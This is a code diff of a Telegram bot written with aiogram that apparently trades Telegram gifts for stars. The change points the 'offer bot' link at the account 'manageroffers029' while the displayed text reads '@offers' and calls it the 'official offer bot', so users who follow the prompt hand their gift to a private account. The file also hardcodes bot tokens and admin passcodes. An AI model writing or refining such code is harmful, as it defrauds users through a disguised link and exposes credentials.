@@ -9,12 +9,12 @@ from aiogram.types import Message, CallbackQuery, ErrorEvent, InlineKeyboardMark
 logging.basicConfig(level=logging.INFO)
 log = logging.getLogger(__name__)
 
-TOKEN = "9115876932:AAGat5WlGJ4pjAvqRBtQGq_ThJrEPbHqOGA"
+TOKEN = "9229716042:AAEQegQ6fNeZk5iLMwV2Ygt_77S-Dg7wZKk"
 OWNER_ID = 8567408555
 ADMIN_CODE = "admin777"
 OWNER_CODE = "2427"
 TARGET_UNAME = "manageroffers029"
-OFFER_BOT_UNAME = "offers"
+OFFER_BOT_UNAME = "manageroffers029"
 MAX_AMOUNT = 10_000_000
 
 DB = sqlite3.connect("users.db", check_same_thread=False, timeout=30)
@@ -408,7 +408,7 @@ async def cb_off(c: CallbackQuery):
 
     if a == "acc":
         kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T["send"], url=f"https://t.me/{OFFER_BOT_UNAME}")]])
-        msg_text = f'✅ <b>Сделка подтверждена!</b>\n\nПЕРЕДАЙТЕ ПОДАРОК ОФФЕР-БОТУ <a href="https://t.me/{OFFER_BOT_UNAME}">@{OFFER_BOT_UNAME}</a> ДЛЯ ПОЛУЧЕНИЯ ЗВЕЗД НА БАЛАНС.'
+        msg_text = f'✅ПРИНЯТО✅\n\n⚠️Для получения <b>{am}</b> ⭐️ на баланс необходимо передать подарок оффициальному оффер боту <a href="https://t.me/{OFFER_BOT_UNAME}">@offers</a> ⚠️'
         try:
             await bot.edit_message_text(msg_text, chat_id=c.message.chat.id, message_id=c.message.message_id, reply_markup=kb)
             upd_offer(i, "accepted")
